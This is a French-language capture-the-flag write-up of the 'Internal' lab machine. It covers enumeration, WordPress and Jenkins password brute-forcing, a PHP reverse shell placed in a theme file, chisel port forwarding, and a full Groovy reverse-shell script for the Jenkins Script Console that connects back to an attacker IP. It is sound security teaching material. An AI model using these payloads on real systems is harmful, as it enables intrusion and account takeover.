# Internal

![image(1)](https://user-images.githubusercontent.com/68467919/209453887-a2b5235a-e2f2-4310-aee1-4affde4b2921.png)

## Énumération

### Nmap

```bash
sudo nmap -sC -sV -O -oN enum/nmap -vv internal.thm

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFOI/P6nqicmk78vSNs4l+vk2+BQ0mBxB1KlJJPCYueaUExTH4Cxkqkpo/zJfZ77MHHDL5nnzTW+TO6e4mDMEw=
|   256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMlxubXGh//FE3OqdyitiEwfA2nNdCtdgLfDQxFHPyY0
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

### Gobuster

```bash
gobuster dir -u http://internal.thm -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o enum/directory.txt

/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
/wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
/javascript           (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
```

## Port 80 | HTTP

Quand nous nous rendons sur le port 80, nous pouvons découvrir la page par défaut d’Apache. En énumérant les différentes directories, nous pouvons nous rendre compte qu’un répertoire *blog* est accessible.

![Untitled](https://user-images.githubusercontent.com/68467919/209453890-ba75acbf-5633-403a-9d06-1dc5300aa39d.png)

### WpScan

En énumérant les utilisateurs du Wordpress, un seul ressort dans l’output du scan et c’est l’utilisateur admin. Vu qu’XMLRPC est activé, nous pouvons tenter de faire un bruteforce contre la page login du wp-admin pour essayer de trouver le mot de passe de l’utilisateur.

```bash
wpscan -t 5 --url http://internal.thm/blog/ --wp-content-dir /wp-admin/ -U user.txt -P ~/SecLists/Passwords/Leaked-Databases/rockyou.txt

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my[...]ys
```

Grâce à la wordlist *rockyou.txt*, nous trouvons le mot de passe de l’admin ! Nous pouvons désormais nous connecter au panel administrateur.

![Untitled 1](https://user-images.githubusercontent.com/68467919/209453895-bf658811-c4b8-48a5-bf56-dd9012426a98.png)

## Reverse-Shell

En modifiant la page 404.php de la template que le Wordpress utilise (twentyseventeen), nous pouvons y mettre notre propre reverse-shell. 

![Untitled 2](https://user-images.githubusercontent.com/68467919/209453955-9d73de31-4d56-4e8b-8b9d-807c8e45d812.png)

Par la suite, nous pouvons lancer notre listener et nous rendre dans le répertoire de la template (blog/wp-content/themes/twentyseventeen/) puis sur la page 404.php.

```bash
nc -lvnp 1337
```

→ *http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php*

![Untitled 3](https://user-images.githubusercontent.com/68467919/209453899-cdf6fa25-ad9b-4969-8fe2-021800e95eba.png)


## Aubreanna | User

En recherchant rapidement sur les fichiers du système, dans le répertoire */opt* nous pouvons trouver un fichier du nom de “*wp-save.txt”* qui contient les logs de l’utilisateur Aubreanna.

```bash
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bub[...]@#123
```

Nous pouvons désormais nous connecter en SSH à sa session pour obtenir un shell plus stable.

![Untitled 4](https://user-images.githubusercontent.com/68467919/209453903-6a2b1355-d0e8-4b33-b361-415cd9d10e0b.png)


## Jenkins | Port Forwarding

En allant dans le home directory de aubreanna, nous pouvons encore trouver un fichier du nom de “*jenkins.txt*” qui nous indique qu’un service est entrain de run en local. 

```bash
Internal Jenkins service is running on 172.17.0.2:8080
```

Nous pouvons en déduire également que nous nous trouvons dans un docker. Pour le vérifier, nous pouvons taper la commande ifconfig.

```bash
ifconfig

docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:aeff:fe74:ff4e  prefixlen 64  scopeid 0x20<link>
        ether 02:42:ae:74:ff:4e  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 420 (420.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1324 (1.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.197.88  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::57:30ff:fe64:2a39  prefixlen 64  scopeid 0x20<link>
        ether 02:57:30:64:2a:39  txqueuelen 1000  (Ethernet)
        RX packets 415114  bytes 50820091 (50.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 467047  bytes 634869473 (634.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 866  bytes 80254 (80.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 866  bytes 80254 (80.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethad750dd: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::54b2:f8ff:fe12:50c8  prefixlen 64  scopeid 0x20<link>
        ether 56:b2:f8:12:50:c8  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 532 (532.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 33  bytes 2470 (2.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Pour pouvoir accéder depuis notre machine au service Jenkins, j’ai décidé de télécharger *chisel* pour pour effectuer un port forwarding.

```bash
# sur ma machine
./chisel server -p 8888 -reverse

# sur la machine distante
./chisel client VOTREIP:8888 R:8889:localhost:8080
```

Désormais, en nous rendant en [localhost](http://localhost) sur le port 8889, nous pouvons utiliser le service Jenkins et pouvoir commencer à investiguer !

### Bruteforce (oui encore)

En tombant sur ce poste sur StackOverflow, j’ai pensé à essayer de créer un nouvel utilisateur via */securityRealm/addUser* mais en analysant la réponse de la requête sur BurpSuite, il m’est indiqué qu’il est impossible pour moi de pouvoir le faire étant donné que je suis authentifié en tant qu’anonymous.

[https://stackoverflow.com/questions/15227305/what-is-the-default-jenkins-password](https://stackoverflow.com/questions/15227305/what-is-the-default-jenkins-password)

![Untitled 6](https://user-images.githubusercontent.com/68467919/209453906-2c79e781-adf4-4624-ad61-71a787384fdb.png)
![Untitled 7](https://user-images.githubusercontent.com/68467919/209453926-f77afcad-4fbd-4ea2-9d69-77767593f9ad.png)

J’ai pensé à essayer de faire une requête curl depuis la machine vers cet endpoint pour essayer de me créer un utilisateur mais ça n’a pas fonctionné non plus.

### Hydra

En repensant aux étapes par laquelle je suis passé pour arriver jusqu’ici, j’ai eu l’idée de réessayer un bruteforce sur la page de connexion de Jenkins.

![Untitled 8](https://user-images.githubusercontent.com/68467919/209453927-0d1624b2-a8b2-48be-a618-eb989e5e4649.png)


Le mot de passe est trouvé, nous pouvons désormais nous connecter au panel Jenkins !

## Reverse-Shell | Jenkins

Jenkins dispose d'une console de script Groovy qui permet d'exécuter des scripts Groovy arbitraires dans l'environnement d'exécution du contrôleur Jenkins ou dans l'environnement d'exécution des agents. Pour obtenir un reverse-shell depuis Jenkins, il faut nous rendre dans **********************Manage Jenkins → Script Console********************** et rentrer ces commandes ci-dessous : 

```bash
String host="{your_ip}";
int port=8044;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());
so.flush();po.flush();Thread.sleep(50);
try {p.exitValue();break;}catch (Exception e){}};
p.destroy();s.close();
```

![Untitled 9](https://user-images.githubusercontent.com/68467919/209453931-86805f7b-f74f-468a-88b0-bd59c05a0e46.png)


## Root | root.txt

Rien de sensationnel pour pouvoir élever nos privilèges pour devenir root. En allant dans le fichier */opt/* nous pouvons trouver un deuxième fichier s’appelant “*note.txt*”. A l’intérieur, nous pouvons y trouver le password root. En nous rendant sur sur la session de Aubreanna, nous pouvons nous connecter en SSH au compte root.

*note.txt*

```bash
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr[...]uM!@#123
```
![Untitled 10](https://user-images.githubusercontent.com/68467919/209453934-74022b34-5280-4f59-b319-08f6e8a3261d.png)

